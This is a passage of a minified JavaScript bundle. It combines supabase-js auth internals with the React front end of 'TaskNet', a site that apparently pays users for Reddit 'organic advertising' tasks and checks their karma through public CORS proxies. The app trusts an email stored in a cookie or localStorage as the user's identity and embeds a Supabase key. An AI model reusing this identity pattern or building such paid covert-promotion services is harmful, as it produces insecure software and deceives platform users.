0)&&c.qr_code)&&(x.totp.qr_code=`data:image/svg+xml;utf-8,${x.totp.qr_code}`),this._returnResult({data:x,error:null}))})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async _verify(r){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async n=>{var l;const{data:c,error:u}=n;if(u)return this._returnResult({data:null,error:u});const h=Object.assign({challenge_id:r.challengeId},"webauthn"in r?{webauthn:Object.assign(Object.assign({},r.webauthn),{credential_response:r.webauthn.type==="create"?fy(r.webauthn.credential_response):py(r.webauthn.credential_response)})}:{code:r.code}),{data:m,error:x}=await ye(this.fetch,"POST",`${this.url}/factors/${r.factorId}/verify`,{body:h,headers:this.headers,jwt:(l=c?.session)===null||l===void 0?void 0:l.access_token});return x?this._returnResult({data:null,error:x}):(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+m.expires_in},m)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",m),this._returnResult({data:m,error:x}))})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}})}async _challenge(r){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async n=>{var l;const{data:c,error:u}=n;if(u)return this._returnResult({data:null,error:u});const h=await ye(this.fetch,"POST",`${this.url}/factors/${r.factorId}/challenge`,{body:r,headers:this.headers,jwt:(l=c?.session)===null||l===void 0?void 0:l.access_token});if(h.error)return h;const{data:m}=h;if(m.type!=="webauthn")return{data:m,error:null};switch(m.webauthn.type){case"create":return{data:Object.assign(Object.assign({},m),{webauthn:Object.assign(Object.assign({},m.webauthn),{credential_options:Object.assign(Object.assign({},m.webauthn.credential_options),{publicKey:dy(m.webauthn.credential_options.publicKey)})})}),error:null};case"request":return{data:Object.assign(Object.assign({},m),{webauthn:Object.assign(Object.assign({},m.webauthn),{credential_options:Object.assign(Object.assign({},m.webauthn.credential_options),{publicKey:hy(m.webauthn.credential_options.publicKey)})})}),error:null}}})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}})}async _challengeAndVerify(r){const{data:n,error:l}=await this._challenge({factorId:r.factorId});return l?this._returnResult({data:null,error:l}):await this._verify({factorId:r.factorId,challengeId:n.id,code:r.code})}async _listFactors(){var r;const{data:{user:n},error:l}=await this.getUser();if(l)return{data:null,error:l};const c={all:[],phone:[],totp:[],webauthn:[]};for(const u of(r=n?.factors)!==null&&r!==void 0?r:[])c.all.push(u),u.status==="verified"&&c[u.factor_type].push(u);return{data:c,error:null}}async _getAuthenticatorAssuranceLevel(){var r,n;const{data:{session:l},error:c}=await this.getSession();if(c)return this._returnResult({data:null,error:c});if(!l)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:u}=yc(l.access_token);let h=null;u.aal&&(h=u.aal);let m=h;((n=(r=l.user.factors)===null||r===void 0?void 0:r.filter(v=>v.status==="verified"))!==null&&n!==void 0?n:[]).length>0&&(m="aal2");const y=u.amr||[];return{data:{currentLevel:h,nextLevel:m,currentAuthenticationMethods:y},error:null}}async _getAuthorizationDetails(r){try{return await this._useSession(async n=>{const{data:{session:l},error:c}=n;return c?this._returnResult({data:null,error:c}):l?await ye(this.fetch,"GET",`${this.url}/oauth/authorizations/${r}`,{headers:this.headers,jwt:l.access_token,xform:u=>({data:u,error:null})}):this._returnResult({data:null,error:new Yt})})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async _approveAuthorization(r,n){try{return await this._useSession(async l=>{const{data:{session:c},error:u}=l;if(u)return this._returnResult({data:null,error:u});if(!c)return this._returnResult({data:null,error:new Yt});const h=await ye(this.fetch,"POST",`${this.url}/oauth/authorizations/${r}/consent`,{headers:this.headers,jwt:c.access_token,body:{action:"approve"},xform:m=>({data:m,error:null})});return h.data&&h.data.redirect_url&&bt()&&!n?.skipBrowserRedirect&&window.location.assign(h.data.redirect_url),h})}catch(l){if(ce(l))return this._returnResult({data:null,error:l});throw l}}async _denyAuthorization(r,n){try{return await this._useSession(async l=>{const{data:{session:c},error:u}=l;if(u)return this._returnResult({data:null,error:u});if(!c)return this._returnResult({data:null,error:new Yt});const h=await ye(this.fetch,"POST",`${this.url}/oauth/authorizations/${r}/consent`,{headers:this.headers,jwt:c.access_token,body:{action:"deny"},xform:m=>({data:m,error:null})});return h.data&&h.data.redirect_url&&bt()&&!n?.skipBrowserRedirect&&window.location.assign(h.data.redirect_url),h})}catch(l){if(ce(l))return this._returnResult({data:null,error:l});throw l}}async _listOAuthGrants(){try{return await this._useSession(async r=>{const{data:{session:n},error:l}=r;return l?this._returnResult({data:null,error:l}):n?await ye(this.fetch,"GET",`${this.url}/user/oauth/grants`,{headers:this.headers,jwt:n.access_token,xform:c=>({data:c,error:null})}):this._returnResult({data:null,error:new Yt})})}catch(r){if(ce(r))return this._returnResult({data:null,error:r});throw r}}async _revokeOAuthGrant(r){try{return await this._useSession(async n=>{const{data:{session:l},error:c}=n;return c?this._returnResult({data:null,error:c}):l?(await ye(this.fetch,"DELETE",`${this.url}/user/oauth/grants`,{headers:this.headers,jwt:l.access_token,query:{client_id:r.clientId},noResolveJson:!0}),{data:{},error:null}):this._returnResult({data:null,error:new Yt})})}catch(n){if(ce(n))return this._returnResult({data:null,error:n});throw n}}async fetchJwk(r,n={keys:[]}){let l=n.keys.find(m=>m.kid===r);if(l)return l;const c=Date.now();if(l=this.jwks.keys.find(m=>m.kid===r),l&&this.jwks_cached_at+bg>c)return l;const{data:u,error:h}=await ye(this.fetch,"GET",`${this.url}/.well-known/jwks.json`,{headers:this.headers});if(h)throw h;return!u.keys||u.keys.length===0||(this.jwks=u,this.jwks_cached_at=c,l=u.keys.find(m=>m.kid===r),!l)?null:l}async getClaims(r,n={}){try{let l=r;if(!l){const{data:S,error:w}=await this.getSession();if(w||!S.session)return this._returnResult({data:null,error:w});l=S.session.access_token}const{header:c,payload:u,signature:h,raw:{header:m,payload:x}}=yc(l);n?.allowExpired||qg(u.exp);const y=!c.alg||c.alg.startsWith("HS")||!c.kid||!("crypto"in globalThis&&"subtle"in globalThis.crypto)?null:await this.fetchJwk(c.kid,n?.keys?{keys:n.keys}:n?.jwks);if(!y){const{error:S}=await this.getUser(l);if(S)throw S;return{data:{claims:u,header:c,signature:h},error:null}}const v=Vg(c.alg),k=await crypto.subtle.importKey("jwk",y,v,!0,["verify"]);if(!await crypto.subtle.verify(v,k,h,Pg(`${m}.${x}`)))throw new zc("Invalid JWT signature");return{data:{claims:u,header:c,signature:h},error:null}}catch(l){if(ce(l))return this._returnResult({data:null,error:l});throw l}}}Ha.nextInstanceID={};const ky=Ha,_y="2.90.1";let Da="";typeof Deno<"u"?Da="deno":typeof document<"u"?Da="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Da="react-native":Da="node";const Ny={"X-Client-Info":`supabase-js-${Da}/${_y}`},Sy={headers:Ny},Ey={schema:"public"},Cy={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},Ty={};function Ka(a){"@babel/helpers - typeof";return Ka=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(r){return typeof r}:function(r){return r&&typeof Symbol=="function"&&r.constructor===Symbol&&r!==Symbol.prototype?"symbol":typeof r},Ka(a)}function Ry(a,r){if(Ka(a)!="object"||!a)return a;var n=a[Symbol.toPrimitive];if(n!==void 0){var l=n.call(a,r);if(Ka(l)!="object")return l;throw new TypeError("@@toPrimitive must return a primitive value.")}return(r==="string"?String:Number)(a)}function Py(a){var r=Ry(a,"string");return Ka(r)=="symbol"?r:r+""}function Ay(a,r,n){return(r=Py(r))in a?Object.defineProperty(a,r,{value:n,enumerable:!0,configurable:!0,writable:!0}):a[r]=n,a}function ff(a,r){var n=Object.keys(a);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(a);r&&(l=l.filter(function(c){return Object.getOwnPropertyDescriptor(a,c).enumerable})),n.push.apply(n,l)}return n}function rt(a){for(var r=1;r<arguments.length;r++){var n=arguments[r]!=null?arguments[r]:{};r%2?ff(Object(n),!0).forEach(function(l){Ay(a,l,n[l])}):Object.getOwnPropertyDescriptors?Object.defineProperties(a,Object.getOwnPropertyDescriptors(n)):ff(Object(n)).forEach(function(l){Object.defineProperty(a,l,Object.getOwnPropertyDescriptor(n,l))})}return a}const Oy=a=>a?(...r)=>a(...r):(...r)=>fetch(...r),Iy=()=>Headers,$y=(a,r,n)=>{const l=Oy(n),c=Iy();return async(u,h)=>{var m;const x=(m=await r())!==null&&m!==void 0?m:a;let y=new c(h?.headers);return y.has("apikey")||y.set("apikey",a),y.has("Authorization")||y.set("Authorization",`Bearer ${x}`),l(u,rt(rt({},h),{},{headers:y}))}};function Dy(a){return a.endsWith("/")?a:a+"/"}function zy(a,r){var n,l;const{db:c,auth:u,realtime:h,global:m}=a,{db:x,auth:y,realtime:v,global:k}=r,_={db:rt(rt({},x),c),auth:rt(rt({},y),u),realtime:rt(rt({},v),h),storage:{},global:rt(rt(rt({},k),m),{},{headers:rt(rt({},(n=k?.headers)!==null&&n!==void 0?n:{}),(l=m?.headers)!==null&&l!==void 0?l:{})}),accessToken:async()=>""};return a.accessToken?_.accessToken=a.accessToken:delete _.accessToken,_}function Uy(a){const r=a?.trim();if(!r)throw new Error("supabaseUrl is required.");if(!r.match(/^https?:\/\//i))throw new Error("Invalid supabaseUrl: Must be a valid HTTP or HTTPS URL.");try{return new URL(Dy(r))}catch{throw Error("Invalid supabaseUrl: Provided URL is malformed.")}}var Ly=class extends ky{constructor(a){super(a)}},My=class{constructor(a,r,n){var l,c;this.supabaseUrl=a,this.supabaseKey=r;const u=Uy(a);if(!r)throw new Error("supabaseKey is required.");this.realtimeUrl=new URL("realtime/v1",u),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",u),this.storageUrl=new URL("storage/v1",u),this.functionsUrl=new URL("functions/v1",u);const h=`sb-${u.hostname.split(".")[0]}-auth-token`,m={db:Ey,realtime:Ty,auth:rt(rt({},Cy),{},{storageKey:h}),global:Sy},x=zy(n??{},m);if(this.storageKey=(l=x.auth.storageKey)!==null&&l!==void 0?l:"",this.headers=(c=x.global.headers)!==null&&c!==void 0?c:{},x.accessToken)this.accessToken=x.accessToken,this.auth=new Proxy({},{get:(v,k)=>{throw new Error(`@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(k)} is not possible`)}});else{var y;this.auth=this._initSupabaseAuthClient((y=x.auth)!==null&&y!==void 0?y:{},this.headers,x.global.fetch)}this.fetch=$y(r,this._getAccessToken.bind(this),x.global.fetch),this.realtime=this._initRealtimeClient(rt({headers:this.headers,accessToken:this._getAccessToken.bind(this)},x.realtime)),this.accessToken&&this.accessToken().then(v=>this.realtime.setAuth(v)).catch(v=>console.warn("Failed to set initial Realtime auth token:",v)),this.rest=new vx(new URL("rest/v1",u).href,{headers:this.headers,schema:x.db.schema,fetch:this.fetch}),this.storage=new xg(this.storageUrl.href,this.headers,this.fetch,n?.storage),x.accessToken||this._listenForAuthEvents()}get functions(){return new px(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}from(a){return this.rest.from(a)}schema(a){return this.rest.schema(a)}rpc(a,r={},n={head:!1,get:!1,count:void 0}){return this.rest.rpc(a,r,n)}channel(a,r={config:{}}){return this.realtime.channel(a,r)}getChannels(){return this.realtime.getChannels()}removeChannel(a){return this.realtime.removeChannel(a)}removeAllChannels(){return this.realtime.removeAllChannels()}async _getAccessToken(){var a=this,r,n;if(a.accessToken)return await a.accessToken();const{data:l}=await a.auth.getSession();return(r=(n=l.session)===null||n===void 0?void 0:n.access_token)!==null&&r!==void 0?r:a.supabaseKey}_initSupabaseAuthClient({autoRefreshToken:a,persistSession:r,detectSessionInUrl:n,storage:l,userStorage:c,storageKey:u,flowType:h,lock:m,debug:x,throwOnError:y},v,k){const _={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new Ly({url:this.authUrl.href,headers:rt(rt({},_),v),storageKey:u,autoRefreshToken:a,persistSession:r,detectSessionInUrl:n,storage:l,userStorage:c,flowType:h,lock:m,debug:x,throwOnError:y,fetch:k,hasCustomAuthorizationHeader:Object.keys(this.headers).some(S=>S.toLowerCase()==="authorization")})}_initRealtimeClient(a){return new Dx(this.realtimeUrl.href,rt(rt({},a),{},{params:rt(rt({},{apikey:this.supabaseKey}),a?.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((a,r)=>{this._handleTokenChanged(a,"CLIENT",r?.access_token)})}_handleTokenChanged(a,r,n){(a==="TOKEN_REFRESHED"||a==="SIGNED_IN")&&this.changedAccessToken!==n?(this.changedAccessToken=n,this.realtime.setAuth(n)):a==="SIGNED_OUT"&&(this.realtime.setAuth(),r=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}};const Fy=(a,r,n)=>new My(a,r,n);function By(){if(typeof window<"u")return!1;const a=globalThis.process;if(!a)return!1;const r=a.version;if(r==null)return!1;const n=r.match(/^v(\d+)\./);return n?parseInt(n[1],10)<=18:!1}By()&&console.warn("  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217");const Wy="https://ekbhneculhhzkwvqvbke.supabase.co",qy="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVrYmhuZWN1bGhoemt3dnF2YmtlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTIyNjMsImV4cCI6MjA4NDU4ODI2M30.dw5o6uor7PC7j9aGMnP-3Jt6U07SJjEkj3peQbjyr3U",X=Fy(Wy,qy),Uc=(a,r,n=30)=>{const l=encodeURIComponent(r),c=new Date;c.setTime(c.getTime()+n*24*60*60*1e3);const u=window.location.protocol==="https:"?";Secure":"";document.cookie=`${a}=${l};expires=${c.toUTCString()};path=/;SameSite=Strict${u}`},Zt=a=>{const r=a+"=",n=document.cookie.split(";");for(let l=0;l<n.length;l++){let c=n[l];for(;c.charAt(0)===" ";)c=c.substring(1,c.length);if(c.indexOf(r)===0){const u=c.substring(r.length,c.length);return decodeURIComponent(u)}}return null},Jf=a=>{document.cookie=`${a}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`,localStorage.removeItem(a)},Vy=a=>{const r=Zt(a);r&&Uc(a,r,30)},Hy=()=>{const a=ur();return Zt("user_email")||localStorage.getItem("user_email")?s.jsx(qc,{to:"/",replace:!0}):s.jsxs("div",{className:"min-h-screen bg-black text-white selection:bg-blue-600",children:[s.jsxs("div",{className:"fixed inset-0 overflow-hidden pointer-events-none",children:[s.jsx("div",{className:"absolute top-[-10%] left-[-10%] w-[70%] h-[70%] rounded-full bg-blue-900/10 blur-[120px]"}),s.jsx("div",{className:"absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] rounded-full bg-blue-900/5 blur-[100px]"})]}),s.jsxs("nav",{className:"relative z-10 h-24 max-w-7xl mx-auto px-8 flex items-center justify-between",children:[s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:"w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-600/20",children:s.jsx("svg",{viewBox:"0 0 24 24",className:"w-6 h-6 fill-white",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),s.jsx("span",{className:"text-2xl font-black tracking-tighter uppercase italic",children:"TaskNet"})]}),s.jsx("button",{onClick:()=>a("/login"),className:"px-8 py-3 bg-white/5 border border-white/10 rounded-2xl font-bold text-sm hover:bg-white/10 transition-all",children:"Sign In"})]}),s.jsxs("main",{className:"relative z-10 max-w-7xl mx-auto px-8 pt-20 pb-32",children:[s.jsxs("div",{className:"max-w-3xl",children:[s.jsxs("div",{className:"inline-flex items-center gap-2 px-4 py-2 bg-blue-600/10 border border-blue-500/20 rounded-full text-blue-500 text-xs font-bold uppercase tracking-widest mb-8 animate-in fade-in slide-in-from-bottom-4 duration-500",children:[s.jsxs("span",{className:"relative flex h-2 w-2",children:[s.jsx("span",{className:"animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"}),s.jsx("span",{className:"relative inline-flex rounded-full h-2 w-2 bg-blue-500"})]}),"Next-Gen Reddit Automation"]}),s.jsxs("h1",{className:"text-6xl md:text-8xl font-black tracking-tighter uppercase italic leading-[0.9] mb-8 animate-in fade-in slide-in-from-bottom-6 duration-700",children:["Empower Your ",s.jsx("span",{className:"text-blue-600",children:"Network"})," Influence."]}),s.jsxs("p",{className:"text-gray-400 text-lg md:text-xl max-w-2xl mb-12 animate-in fade-in slide-in-from-bottom-8 duration-1000 leading-relaxed",children:["Grow your business ",s.jsx("span",{className:"text-blue-500 font-black italic",children:"2x faster"})," by leveraging the power of organic Reddit advertising."]}),s.jsx("div",{className:"flex flex-col sm:flex-row gap-4 animate-in fade-in slide-in-from-bottom-10 duration-1000",children:s.jsxs("button",{onClick:()=>a("/login"),className:"px-10 py-5 bg-blue-600 text-white rounded-[24px] font-bold text-lg hover:bg-blue-700 transition-all shadow-2xl shadow-blue-600/40 flex items-center justify-center gap-3 group",children:["Get Started Now",s.jsx(Vc,{size:20,className:"group-hover:translate-x-1 transition-transform"})]})})]}),s.jsx("div",{className:"mt-32 animate-in fade-in slide-in-from-bottom-12 duration-1000 delay-300",children:s.jsxs("div",{className:"p-12 bg-white/[0.02] border border-white/5 rounded-[40px] hover:border-blue-500/20 transition-all group text-center max-w-4xl mx-auto",children:[s.jsx("div",{className:"w-20 h-20 bg-blue-600/10 rounded-[24px] flex items-center justify-center mb-8 mx-auto group-hover:scale-110 transition-transform border border-blue-500/20",children:s.jsx(Jc,{className:"text-blue-500",size:40})}),s.jsx("h3",{className:"text-4xl font-black mb-4 italic uppercase tracking-tighter",children:"Join Discord & Contact Admins"}),s.jsx("p",{className:"text-gray-400 text-xl font-medium leading-relaxed max-w-2xl mx-auto mb-8",children:"Want to scale your reach? Contact our administration team on Discord to build your custom advertisement campaign."}),s.jsx("button",{onClick:()=>window.open("https://discord.gg/ND296AgTyc","_blank"),className:"px-12 py-4 bg-white text-black rounded-2xl font-black text-sm uppercase tracking-[0.2em] hover:bg-blue-500 hover:text-white transition-all shadow-xl active:scale-[0.98]",children:"Open Discord Server"})]})})]}),s.jsx("footer",{className:"relative z-10 border-t border-white/5 py-12",children:s.jsxs("div",{className:"max-w-7xl mx-auto px-8 flex flex-col md:flex-row items-center justify-between gap-8 text-gray-600 text-xs font-bold uppercase tracking-widest",children:[s.jsx("p",{children:" 2026 TaskNet Infrastructure. All Rights Reserved."}),s.jsxs("div",{className:"flex gap-10",children:[s.jsx("button",{onClick:()=>a("/privacy"),className:"hover:text-white transition-colors",children:"Privacy Policy"}),s.jsx("button",{onClick:()=>a("/terms"),className:"hover:text-white transition-colors",children:"Terms of Service"}),s.jsx("a",{href:"https://discord.gg/3KUHvggF6k",target:"_blank",rel:"noreferrer",className:"hover:text-white transition-colors",children:"Contact Support"})]})]})})]})},nl=new Map,Ky=8640*60*1e3,Gy=()=>{const a=ur(),[r,n]=j.useState(!1),[l,c]=j.useState(null),[u,h]=j.useState(null),[m,x]=j.useState(null),[y,v]=j.useState(0),[k,_]=j.useState(!1),[S,w]=j.useState([]),E=Zt("user_email")||localStorage.getItem("user_email")||"";j.useEffect(()=>{const F=ne=>{if(k&&ne.target instanceof Element){const ue=ne.target.closest(".alerts-modal"),Ee=ne.target.closest(".bell-button");!ue&&!Ee&&_(!1)}};return document.addEventListener("mousedown",F),()=>document.removeEventListener("mousedown",F)},[k]),j.useEffect(()=>{if(E){T(),D(),z();const F=X.channel("profile-changes").on("postgres_changes",{event:"UPDATE",schema:"public",table:"profiles",filter:`email=eq.${E}`},()=>{T()}).subscribe(),ne=X.channel("alert-changes").on("postgres_changes",{event:"INSERT",schema:"public",table:"admin_alerts",filter:`user_email=eq.${E}`},()=>{D(),z()}).subscribe();return()=>{X.removeChannel(F),X.removeChannel(ne)}}},[E]);const T=async()=>{try{const{data:F,error:ne}=await X.from("profiles").select("server_username, reddit_username, balance").eq("email",E).single();if(ne){const{data:ue,error:Ee}=await X.from("profiles").select("server_username, reddit_username").eq("email",E).single();ue&&(c({...ue,balance:0}),ue.reddit_username&&I(ue.reddit_username))}else F&&(c(F),F.reddit_username&&I(F.reddit_username))}catch{}},D=async()=>{const{count:F}=await X.from("admin_alerts").select("*",{count:"exact",head:!0}).eq("user_email",E).eq("is_read",!1);v(F||0)},z=async()=>{const{data:F,error:ne}=await X.from("admin_alerts").select("*").eq("user_email",E).order("created_at",{ascending:!1});ne||w(F||[])},I=async F=>{try{const ne=nl.get(F);if(ne&&Date.now()-ne.timestamp<Ky){h(ne.karma),x(ne.status),ne.karma!==null&&X.from("profiles").update({reddit_karma:ne.karma}).eq("email",E);return}const ue=`https://www.reddit.com/user/${F}/about.json`,Ee=`https://old.reddit.com/user/${F}/about.json`,ze=[`https://reddapi.p.rapidapi.com/api/user_info?username=${F}`,`https://api.redditmetrics.com/user/${F}`,`https://api.allorigins.win/raw?url=${encodeURIComponent(ue)}`,`https://corsproxy.io/?${encodeURIComponent(ue)}`,`https://proxy.cors.sh/${ue}`,`https://cors-proxy.htmldriven.com/?url=${encodeURIComponent(ue)}`,`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(ue)}`,`https://thingproxy.freeboard.io/fetch/${ue}`,`https://yacdn.org/proxy/${ue}`,`https://cors.bridged.cc/${ue}`,`https://cors-proxy.fringe.zone/${ue}`,Ee,ue];for(const Re of ze)try{const de=new AbortController,ae=setTimeout(()=>de.abort(),5e3),we=await fetch(Re,{headers:{Accept:"application/json","x-rapidapi-host":"reddapi.p.rapidapi.com"},signal:de.signal});if(clearTimeout(ae),we.ok){const he=await we.json();if(he){if(Re.includes("reddapi.p.rapidapi.com")){if(he.data&&he.data.total_karma!==void 0){const U=he.data.total_karma;x("active"),h(U),nl.set(F,{karma:U,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),X.from("profiles").update({reddit_karma:U}).eq("email",E);break}}else if(Re.includes("api.redditmetrics.com")){if(he.karma!==void 0){const U=he.karma;x("active"),h(U),nl.set(F,{karma:U,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),X.from("profiles").update({reddit_karma:U}).eq("email",E);break}}else if(he.data){const U=he.data,Z=U.total_karma??(U.link_karma||0)+(U.comment_karma||0);x("active"),h(Z),nl.set(F,{karma:Z,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),X.from("profiles").update({reddit_karma:Z}).eq("email",E);break}}}}catch(de){if(de.name==="AbortError")continue;continue}!m&&u===null&&x("not_found")}catch{u===null&&x("not_found")}},H=()=>{localStorage.removeItem("user_email"),Jf("user_email"),a("/welcome")},te=l?.server_username||E.split("@")[0];l?.reddit_username;const J=[{icon:s.jsx(nx,{size:18}),label:"Home",path:"/"},{icon:s.jsx(ix,{size:18}),label:"Tasks",path:"/tasks"},{icon:s.jsx(cx,{size:18}),label:"Payouts",path:"/withdraw"}];return s.jsxs("div",{className:"h-20 bg-black text-white border-b border-white/5 sticky top-0 z-50 backdrop-blur-md bg-black/80",children:[s.jsxs("div",{className:"h-full max-w-7xl mx-auto px-4 sm:px-8 flex items-center justify-between",children:[s.jsxs("div",{className:"flex items-center gap-4 md:gap-10",children:[s.jsxs("div",{className:"flex items-center gap-3 cursor-pointer",onClick:()=>a("/"),children:[s.jsx("div",{className:"w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-700 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/20 group transition-transform hover:scale-105",children:s.jsx("svg",{viewBox:"0 0 24 24",className:"w-6 h-6 fill-white",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),s.jsxs("div",{className:"hidden xs:block",children:[s.jsx("span",{className:"text-xl font-black tracking-tighter text-blue-500",children:"TASK"}),s.jsx("span",{className:"text-xl font-black tracking-tighter text-white",children:"NET"})]})]}),s.jsx("nav",{className:"hidden md:flex items-center gap-2",children:J.map(F=>s.jsxs(Mc.Fragment,{children:[s.jsxs(Mh,{to:F.path,className:({isActive:ne})=>`flex items-center gap-2 px-6 py-2 rounded-xl transition-all duration-200 group relative ${ne?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white hover:bg-white/5"}`,children:[s.jsx("span",{className:"transition-transform group-hover:scale-110",children:F.icon}),s.jsx("span",{className:"font-bold text-sm",children:F.label})]}),F.label==="Payouts"&&l?.reddit_username&&s.jsxs("div",{className:"flex flex-col ml-2 pl-4 border-l border-white/10 select-none animate-in fade-in slide-in-from-left-2 duration-500",children:[s.jsxs("div",{className:"flex items-center gap-1.5",children:[s.jsxs("span",{className:"text-[10px] font-black text-white/90 tracking-tight",children:["u/",l.reddit_username]}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] font-black text-blue-400 tracking-tighter",children:u!==null?`${u.toLocaleString()} KARMA`:"---"})]}),s.jsxs("div",{className:"flex items-center gap-1 mt-0.5",children:[s.jsx("div",{className:`w-1 h-1 rounded-full ${m==="active"?"bg-emerald-500 shadow-[0_0_5px_rgba(16,185,129,0.5)]":"bg-red-500"}`}),s.jsx("span",{className:`text-[8px] font-black uppercase tracking-widest ${m==="active"?"text-emerald-500":"text-red-500"}`,children:m||"checking..."})]})]})]},F.path))})]}),s.jsxs("div",{className:"flex items-center gap-2 sm:gap-4",children:[s.jsxs("button",{onClick:()=>a("/withdraw"),className:"hidden xs:flex items-center gap-2 px-4 py-2 bg-white/[0.03] border border-white/5 rounded-xl hover:bg-white/5 transition-all group",children:[s.jsx(Hn,{size:16,className:"text-emerald-500 group-hover:scale-110 transition-transform"}),s.jsxs("span",{className:"text-xs font-black text-white",children:["$",l?.balance?.toFixed(2)||"0.00"]})]}),s.jsxs("button",{onClick:F=>{F.preventDefault(),F.stopPropagation(),n(!1),y>0&&(X.from("admin_alerts").update({is_read:!0}).eq("user_email",E),v(0)),_(!k)},className:"hidden md:flex p-4 text-gray-400 hover:text-white transition-colors relative bell-button active:scale-90 touch-manipulation z-[60]",style:{minWidth:"48px",minHeight:"48px"},children:[s.jsx(Nc,{size:22}),y>0&&!k&&s.jsx("span",{className:"absolute top-2.5 right-2.5 w-2.5 h-2.5 bg-blue-600 rounded-full border-2 border-black animate-pulse"})]}),k&&s.jsxs("div",{className:"fixed top-[80px] right-2 left-2 sm:left-auto sm:right-4 sm:w-80 z-[200] alerts-modal bg-[#080808] border border-white/10 rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden animate-in fade-in slide-in-from-top-4 duration-300",children:[s.jsxs("div",{className:"px-5 py-4 border-b border-white/5 bg-white/[0.01] flex items-center justify-between",children:[s.jsx("h3",{className:"font-bold text-white",children:"Notifications"}),s.jsx("button",{onClick:F=>{F.stopPropagation(),_(!1)},className:"p-2 text-gray-500 hover:text-white rounded-lg hover:bg-white/10 transition-all active:scale-90",children:s.jsx(De,{size:18})})]}),s.jsx("div",{className:"max-h-[60vh] sm:max-h-96 overflow-y-auto",children:S.length>0?S.map(F=>s.jsxs("div",{className:`px-5 py-4 border-b border-white/5 ${F.is_read?"bg-white/[0.01]":"bg-blue-600/10"}`,children:[s.jsx("p",{className:"text-sm text-white",children:F.message}),s.jsx("p",{className:"text-xs text-gray-500 mt-1",children:new Date(F.created_at).toLocaleString()})]},F.id)):s.jsx("div",{className:"px-5 py-8 text-center",children:s.jsx("p",{className:"text-gray-500 text-sm",children:"No notifications yet"})})})]}),s.jsx("button",{onClick:F=>{F.preventDefault(),F.stopPropagation(),a("/account")},className:"hidden sm:flex items-center justify-center w-14 h-14 text-gray-400 hover:text-blue-500 hover:bg-white/5 rounded-xl transition-all active:scale-95 relative z-[60]",title:"Account Settings",children:s.jsx(Wh,{size:24})}),s.jsx("div",{className:"hidden sm:flex items-center gap-3 px-2 py-1.5 rounded-full border border-white/5 bg-white/[0.03] hover:bg-white/[0.06] transition-all group pointer-events-none select-none",children:s.jsxs("div",{className:"flex items-center gap-3 pl-2",children:[s.jsx("span",{className:"text-sm font-bold text-white group-hover:text-blue-400 transition-colors max-w-[100px] truncate",children:te}),s.jsx("div",{className:"w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-xs font-black text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] transition-transform uppercase",children:te[0]})]})}),s.jsx("div",{onClick:()=>a("/account"),className:"sm:hidden w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center text-xs font-black text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] active:scale-95 transition-transform uppercase cursor-pointer",children:te[0]}),s.jsx("button",{onClick:()=>{_(!1),n(!r)},className:"md:hidden p-2 text-gray-400 hover:text-white transition-colors touch-manipulation",children:r?s.jsx(De,{size:24}):s.jsx(lx,{size:24})})]})]}),r&&s.jsx("div",{className:"md:hidden absolute top-20 left-0 right-0 bg-black/95 backdrop-blur-xl border-b border-white/5 animate-in slide-in-from-top duration-300 